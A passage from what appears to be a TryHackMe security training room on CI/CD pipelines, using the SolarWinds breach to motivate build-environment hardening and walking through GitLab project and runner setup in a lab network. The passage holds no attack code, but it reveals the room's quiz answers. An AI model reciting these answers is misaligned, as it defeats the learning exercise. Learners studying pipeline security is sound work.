<li class=""><strong>Frequent iterations</strong> - By making frequent commits, conflicts occur less frequently. Hence, commits should be kept smaller and made regularly.</li>
<li class=""><strong>Stable testing environments</strong> - Code should be tested in an environment that mimics production as closely as possible.</li>
<li class=""><strong>Maximum visibility</strong> - Each developer should have access to the latest builds and code to understand and see the changes that have been made.</li>
<li class=""><strong>Predictable deployments anytime</strong> - The pipeline should be streamlined to ensure that deployments can be made at any time with almost no risk to production stability.</li>
</ul>
<p>While all of these fundamentals will help to ensure that CI/CD can streamline the DevOps process, none of these really focus on ensuring that the automation does not increase the attack surface or make the pipeline vulnerable to attacks.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="a-typical-cicd-pipeline">A Typical CI/CD Pipeline<a href="#a-typical-cicd-pipeline" class="hash-link" aria-label="Direct link to A Typical CI/CD Pipeline" title="Direct link to A Typical CI/CD Pipeline" translate="no">​</a></h3>
<p>So what does a typical CI/CD-enabled pipeline look like? The network diagram of this room helps a bit to explain this. Let&#x27;s work through the different components that can be found in this pipeline:</p>
<ul>
<li class=""><strong>Developer workstations</strong> - Where the coding magic happens, developers craft and build code. In this network, this is simulated through your AttackBox.</li>
<li class=""><strong>Source code storage solution</strong> - This is a central placeholder to store and track different code versions. This is the Gitlab server found in our network.</li>
<li class=""><strong>Build orchestrator</strong> - Coordinates and manages the automation of the build and deployment environments. Both Gitlab and Jenkins are used as build servers in this network.</li>
<li class=""><strong>Build agents</strong> - These machines build, test and package the code. We are using GitLab runners and Jenkins agents for our build agents.</li>
<li class=""><strong>Environments</strong> - Briefly mentioned above, there are typically environments for development, testing (staging) and production (live code). The code is built and validated through the stages. In our network, we have both a DEV and PROD environment.</li>
</ul>
<p>Throughout this room, we will explore the CI/CD components in more detail and show the common security misconfigurations found here. It should be noted that DevOps pipelines with CI/CD can take many forms depending on the tools used, but the security principles that should be applied remain the same.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="solarwinds-case">SolarWinds Case<a href="#solarwinds-case" class="hash-link" aria-label="Direct link to SolarWinds Case" title="Direct link to SolarWinds Case" translate="no">​</a></h3>
<p>The SolarWinds breach was a significant cyberattack discovered in December 2020. The attackers compromised SolarWinds&#x27; software supply chain, injecting a malicious code known as SUNBURST into the company&#x27;s Orion software updates. The attackers managed to gain unauthorised access to numerous organisations&#x27; networks, including government agencies and private companies. The breach highlighted the critical importance of securing software supply chains and the potential impact of a single compromised vendor on many entities.</p>
<p>We will use this case as we go through measures we can apply to ensure our build environment is secure. These measures are implementing isolation and segmentation techniques and setting up appropriate access controls and permissions to limit unauthorised access.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="implement-isolation-and-segmentation-techniques">Implement Isolation and Segmentation Techniques<a href="#implement-isolation-and-segmentation-techniques" class="hash-link" aria-label="Direct link to Implement Isolation and Segmentation Techniques" title="Direct link to Implement Isolation and Segmentation Techniques" translate="no">​</a></h4>
<p>The SolarWinds incident highlighted the significance of isolating and segmenting critical components within the build system. By separating different stages of the build process and employing strict access controls, you can mitigate the risk of a single compromised component compromising the entire system. Isolation can be achieved through containerisation or virtualisation technologies, creating secure sandboxes to execute build processes without exposing the entire environment.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="set-up-appropriate-access-controls-and-permissions">Set Up Appropriate Access Controls and Permissions<a href="#set-up-appropriate-access-controls-and-permissions" class="hash-link" aria-label="Direct link to Set Up Appropriate Access Controls and Permissions" title="Direct link to Set Up Appropriate Access Controls and Permissions" translate="no">​</a></h4>
<p>Limiting unauthorised access to the built environment is crucial for maintaining the integrity and security of the system. Following the principle of least privilege, grant access only to individuals or groups who require it to perform their specific tasks. Implement robust authentication mechanisms such as multi-factor authentication (MFA) and enforce strong password policies. Additionally, regularly review and update access controls to ensure that access privileges align with the principle of least privilege.</p>
<p>Implementing strict controls on privileged accounts is essential, including limiting the number of individuals with administrative access and strict monitoring and auditing mechanisms for privileged activities.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="a-note-on-network-security">A note on Network Security<a href="#a-note-on-network-security" class="hash-link" aria-label="Direct link to A note on Network Security" title="Direct link to A note on Network Security" translate="no">​</a></h4>
<p>Network security is vital in protecting the build system from external threats. Implementing appropriate network segmentation, such as dividing the built environment into separate network zones, can help contain potential breaches and limit lateral movement. Here are a few more essential points to consider:</p>
<ul>
<li class="">Implement secure communication channels for software updates and ensure that any third-party components or dependencies are obtained from trusted sources.</li>
<li class="">Regularly monitor and assess the security of your software suppliers to identify and address potential risks or vulnerabilities.</li>
</ul>
<p>Learning from incidents such as the SolarWinds attack helps us recognise the critical importance of securing the entire build process, from code development to deployment, to safeguard against potential threats and ensure the trustworthiness of your software.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What element of a CI/CD pipeline coordinates and manages the automation of build and deployment environments? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">build orchestrator</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What element of a CI/CD pipeline builds, tests, and packages code? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">build agents</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What fundamental of CI/CD promotes developers in having access to the latest builds and code in order to understand and see the changes that have been made? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">maximum visibility</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-4-creating-your-own-pipeline">Task 4 Creating your own Pipeline<a href="#task-4-creating-your-own-pipeline" class="hash-link" aria-label="Direct link to Task 4 Creating your own Pipeline" title="Direct link to Task 4 Creating your own Pipeline" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="introduction-1">Introduction<a href="#introduction-1" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction" translate="no">​</a></h3>
<p>Before we explore misconfigurations, it is worth us first creating our very own pipeline so we can play around.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="gitlab-registration">Gitlab Registration<a href="#gitlab-registration" class="hash-link" aria-label="Direct link to Gitlab Registration" title="Direct link to Gitlab Registration" translate="no">​</a></h3>
<p>We will start the process by creating an account on the GitLab instance. Navigate to <a href="http://gitlab.tryhackme.loc/" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc</a> and select the <strong>Register Now</strong> option on the page. Fill in the required details to create your account and register. Remember to select a secure password and save it for your journey through this network! Once authenticated, you should be met by this page:</p>
<p><img decoding="async" loading="lazy" alt="authentication success" src="/TryHackMe-CN/en/assets/images/image_20251110-101014-d4cab0ef9a2371717a8cd90cc4568309.png" width="1423" height="810" class="img_ev3q"></p>
<p>Feel free to explore the features of the Gitlab server. Gitlab is quite similar to Github; however, it allows you to host your very own server!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="project-creation">Project Creation<a href="#project-creation" class="hash-link" aria-label="Direct link to Project Creation" title="Direct link to Project Creation" translate="no">​</a></h3>
<p>Now that you have an account, the next step is to create a new project. Feel free to create some of your projects directly to play around with the feature. However, since we want to play around with pipelines, you can make a fork of an existing project that has been created for this purpose.</p>
<p>Click on the Your work tab, then the Explore option, and search for BasicBuild. You will see a project like this:</p>
<p><img decoding="async" loading="lazy" alt="project options" src="/TryHackMe-CN/en/assets/images/image_20251110-101042-d83dc6eda2c14d6f748dea19de6d0b4b.png" width="1172" height="646" class="img_ev3q"></p>
<p>Once done, you can fork the project! This now creates a copy of the project you own and can configure.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-cicd-configuration">Understanding CI/CD Configuration<a href="#understanding-cicd-configuration" class="hash-link" aria-label="Direct link to Understanding CI/CD Configuration" title="Direct link to Understanding CI/CD Configuration" translate="no">​</a></h3>
<p>In Gitlab, project automation is defined in the .gitlab-ci.yml file. This file contains the steps that will be performed automatically when a new commit is made to the repo. Understanding what the commands in this file do will be important on your journey of learning about build security. Let&#x27;s take a look at the contents of the file.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="stages">Stages<a href="#stages" class="hash-link" aria-label="Direct link to Stages" title="Direct link to Stages" translate="no">​</a></h4>
<p>GitLab CI files allow you to define various jobs. Each job has different steps that must be executed, as found in the script section of the job. Usually, there are three stages to any CI pipeline, namely the build, test, and deploy stage, but there can be more. Let&#x27;s take a look at the build job:</p>
<div class="language-yml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">.gitlab-ci.yml</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">build-job</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">stage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">script</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;Hello</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> $GITLAB_USER_LOGIN</span><span class="token tag" style="color:#00009f">!</span><span class="token plain">&quot;</span><br></span></code></pre></div></div>
<p>The first line, build-job, is the name of the job. The stage value is to tell Gitlab which stage of the CI Pipeline this job belongs to. As mentioned before, this can be built, tested, or deployed. Jobs in each stage are executed in parallel. That means all build jobs will execute simultaneously, as will all test and deploy jobs. If a job fails, later stages will not start. If a job does not specify a stage, it will automatically be assigned to the test stage. If you have to change the job order, you can use the needs section to define the names of jobs that have to be completed before the next job can be executed.</p>
<p>The script portion details the commands that will be executed as part of the job. As you can see, only an echo command will execute for this build job. However, we normally complete all the build activities in the build stage, such as loading dependencies and compiling our code. Since we are deploying a simple PHP website, there is no reason for code compiling.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tests">Tests<a href="#tests" class="hash-link" aria-label="Direct link to Tests" title="Direct link to Tests" translate="no">​</a></h4>
<p>Tests jobs are meant to perform tests on the build to ensure everything works as expected. Usually, you would execute more than one test job to ensure that you can individually test portions of the application. If one test job fails, the other test jobs will still continue, allowing you to determine all the issues with the current build, rather than having to do multiple builds. Let&#x27;s take a look at the two test cases:</p>
<div class="language-yml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">.gitlab-ci.yml</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">test-job1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">stage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">script</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;This job tests something&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">test-job2</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">stage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">script</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;This job tests something</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> but takes more time than test</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">job1.&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;After the echo commands complete</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> it runs the sleep command for 20 seconds&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;which simulates a test that runs 20 seconds longer than test</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">job1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> sleep 20</span><br></span></code></pre></div></div>
<p>As you can see, we don&#x27;t have anything to test with our simple PHP web application. However, we can simulate that one test case will take longer than the other.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="deployment">Deployment<a href="#deployment" class="hash-link" aria-label="Direct link to Deployment" title="Direct link to Deployment" translate="no">​</a></h4>
<p>In the deployment stage, we want to deploy our application to the relevant environment if both the build and test stages succeed. Usually, branches are used in source code repos, with the main branch being the only one that can deploy to production. Other branches will deploy to environments such as DEV or UAT. Let&#x27;s take a look at what we are doing in the deployment job:</p>
<div class="language-yml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">.gitlab-ci.yml</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">deploy-prod</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">stage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> deploy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">script</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;This job deploys something from the $CI_COMMIT_BRANCH branch.&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;Making the website directory&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> mkdir </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">p /tmp/time/cicd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;Copying the website files&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> cp website_src/* /tmp/time/cicd/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;Hosting website using a screen&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> screen </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">d </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">m php </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">S 127.0.0.1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">8081 </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">t /tmp/time/cicd/ &amp;    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;Deployment complete</span><span class="token tag" style="color:#00009f">!</span><span class="token plain"> Navigate to http</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">//localhost</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">8081/ to test</span><span class="token tag" style="color:#00009f">!</span><span class="token plain">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">environment</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> production</span><br></span></code></pre></div></div>
<p>The first step of the deploy job is to create a new directory under /tmp/ where we can place our web application. We then copy the web application files to the directory and alter the permissions of the files. Once done, host the application, making use of PHP. Now, we are ready to launch our application!</p>
<p>CI files can become a lot more complex as there are a lot more sections and keywords that you could use. If you want to learn more, you can look <a href="https://docs.gitlab.com/ee/ci/yaml/index.html" target="_blank" rel="noopener noreferrer" class="">here</a>. Now that we better understand the embedded automation, let&#x27;s look at actually using it. To have the build execute, we need to register a runner.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="runner-registration">Runner Registration<a href="#runner-registration" class="hash-link" aria-label="Direct link to Runner Registration" title="Direct link to Runner Registration" translate="no">​</a></h3>
<p>In Gitlab, we use runners to execute the tasks configured in the project. Let&#x27;s follow the process to register your attack machine as a runner for your project.</p>
<p><strong>Note</strong>: Make sure that PHP is installed (<code>sudo apt install php7.2-cli</code>) before continuing. Note that if you are doing this on your own machine, ensure you are okay with the runner deploying a web application to your machine. If not, it is best to perform this on the AttackBox.</p>
<p>In your project, click on Settings and then CI/CD:</p>
<p><img decoding="async" loading="lazy" alt="CI/CD menu setting" src="/TryHackMe-CN/en/assets/images/image_20251113-101310-e66eff75005060c2d5cc6dd2ca232d4c.png" width="254" height="386" class="img_ev3q"></p>
<p>Expand the Runners section, and you should see the following screen:</p>
<p><img decoding="async" loading="lazy" alt="runner section" src="/TryHackMe-CN/en/assets/images/image_20251113-101327-f5c316dcb63d8eeb4d9c141bf204b619.png" width="1268" height="702" class="img_ev3q"></p>
<p>Here, you will be able to configure a new runner for your project. Click the three dots and the Show Runner installation steps button. You will see the following screen:</p>
<p><img decoding="async" loading="lazy" alt="runner installation button" src="/TryHackMe-CN/en/assets/images/image_20251113-101349-f99d6b2695b77e09a21d073b38b1b95d.png" width="761" height="840" class="img_ev3q"></p>
<p>The first code block is to install the GitLab-runner application. Follow these steps to install the application on your attack machine. Once done, use the command in the second code block to register your runner. Follow the prompts as shown below for the installation process:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@ip-10-10-45-212:~</span><span class="token comment" style="color:#999988;font-style:italic"># sudo gitlab-runner register --url http://gitlab.tryhackme.loc/ --registration-token &quot;token&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Runtime platform                                    </span><span class="token assign-left variable" style="color:#36acaa">arch</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">amd64 </span><span class="token assign-left variable" style="color:#36acaa">os</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">linux </span><span class="token assign-left variable" style="color:#36acaa">pid</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7248</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">revision</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">782e15da </span><span class="token assign-left variable" style="color:#36acaa">version</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">16.2</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Running </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> system-mode.                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter the GitLab instance URL </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">for example, https://gitlab.com/</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">http://gitlab.tryhackme.loc/</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter the registration token:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;token&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter a description </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the runner:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ip-10-10-45-212</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: runner-attackbox</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter tags </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the runner </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">comma-separated</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">production</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter optional maintenance note </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> the runner:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WARNING: Support </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> registration tokens and runner parameters </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> the </span><span class="token string" style="color:#e3116c">&#x27;register&#x27;</span><span class="token plain"> </span><span class="token builtin class-name">command</span><span class="token plain"> has been deprecated </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> GitLab Runner </span><span class="token number" style="color:#36acaa">15.6</span><span class="token plain"> and will be replaced with support </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> authentication tokens. For </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> information, see https://gitlab.com/gitlab-org/gitlab/-/issues/380872 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Registering runner</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">. succeeded                     </span><span class="token assign-left variable" style="color:#36acaa">runner</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">GR1348941qguXCM9b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter an executor: shell, virtualbox, instance, kubernetes, custom, docker, docker-windows, docker+machine, parallels, ssh, docker-autoscaler:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Runner registered successfully. Feel </span><span class="token function" style="color:#d73a49">free</span><span class="token plain"> to start it, but </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> it&#x27;s running already the config should be automatically reloaded</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Configuration </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">with the authentication token</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> was saved </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/etc/gitlab-runner/config.toml&quot;</span><br></span></code></pre></div></div>
<p>Now that your runner is configured, you can refresh the page on Gitlab, and you should see your runner:</p>
<p><img decoding="async" loading="lazy" alt="runner successfully installed" src="/TryHackMe-CN/en/assets/images/image_20251114-101442-696ec126715269f151ad0822f0173aad.png" width="588" height="159" class="img_ev3q"></p>
<p>The last step is configuring your runner to execute untagged jobs, as our current CI Pipeline does not use tags. Normally, tags would be used to ensure that the correct runners pick up the various jobs. However, since we have a simple job, we can just tell our runner to execute all jobs. Click the little pencil icon and click Run untagged jobs:</p>
<p><img decoding="async" loading="lazy" alt="run button" src="/TryHackMe-CN/en/assets/images/image_20251115-101500-053c0d59e022e64453a86afc25ff4a0d.png" width="1011" height="735" class="img_ev3q"></p>
<p>You are now ready to start the build process!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="build-automation">Build Automation<a href="#build-automation" class="hash-link" aria-label="Direct link to Build Automation" title="Direct link to Build Automation" translate="no">​</a></h3>
<p>Now that the runner is registered, we can test the build process by making a new commit. The easiest change to make that would kick off a build is to update the README.md file:</p>
<ol>
<li class="">lick on the file in the repo</li>
<li class="">Select Edit</li>
<li class="">Select Edit single file</li>
<li class="">Make an update to the file</li>
<li class="">Click Commit changes</li>
</ol>
<p>Once done, your build process will have started! We can follow the process by clicking on Build and then Pipelines:</p>
<p><img decoding="async" loading="lazy" alt="build pipelines button" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAABLCAIAAAAQ+M4qAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAq+SURBVHhe7d1rVBNnGgfwJ5IAAaFkpUqQS0O6rlzarYDnFLBuqVguFVEqRFCka1NkRbwgFqlt1SKKLq5FzSoQEIF6IaistwVBahUv2y6holA5FQHrJgGp4bIwaED2w9AQptQlyock8/wOhzO887zvp/nP9WWGoXoyAAjRz6NHyslTJk2gNiNEJxgARGsYAERrGABEaxgARGsYAERrGABEaxgARGsYAERrGABEaxgARGsYAERrjHGcDCeXyf4trZHLFI8eKTs6lACQlpZKLUJIN4znZDi5TJaVlZOxV3S16trg4CDf6RUej0ctQkj3jMMRoLzi4sWKSo6Vlc8sbw8PdzabDQCSouJ795qSNm6gVo8mJuYvtbW15LKVldW7786Nj49jsVjUOg3r129wcuLFxa2USE5UVn594MB+agVAfn7B7dt1u3alUVcgNF5HAElR8cWKSg/3GavXrJo1y4fc+gHgkbLDisOhVv+2qKglp04VnzpVnJKy9dq169nZOdSKkWbPfsvd3Z3aipCWnicAVVVXs7JysrJyMjL2V0trPNxneHh4ZGSI0tLS7zU2AQBBEE1NTba2NtSev83CwoLL5XK53JkzPYXC5ZWVX1MrRgoJme/l9Sa1FSEtaR2AM2fOnj17vpfo7SV65XK5DdcmLHyRRFJsyjYxZZsUSU4AQHW1FAA8PZ5zD81gMIyNh85//P2DpNIacrmtre3NN326u/8LAMnJm8TiUY4Sx48XhYQsnD3bNyUlVaXqp65GBuTrS5cuXfqG2qolrQNw9ep1Hx+vtWvip3K5ABC9bCkAEH0EAxgMYDBgkCCIqqrrPB6Pa2tL7TwGLS0tYnFuUFAQdcUYnD59Njc3Lynp46KiYw4ODkVFEmoFMhRlpWU10u+l0prSsgvUddrQLgDkGY6ri6tSqSRPfjgcDgAsi4rqI4g+gggLW3T2zLmODuX8YO224OzsHF9fv7ffniMQRNrackNDF1ArxqCoSCIUfujt7WVjMyU6OmratN9TK5BBKCstq6v/wdXF2dXFub6u/kUyoF0AZHIZAHB+Z1VRfhEA/ObOIdud+LykjRuSNm6orq6ultbM8XtH291/eHhYQUFeYeHh7OzMx48fx8evefr0KbXomQYHB5uamlxdndUtzs7Dy8hgqLd+/wB//wD/F8yAdgFQKpWmpiYAoLn7V69SXxPP9RsKxti99JKlnZ2dnZ3da6+57d7918bGe/X1P1CLxmBgYPiurvpCAhmSHxsbya2f/JPMw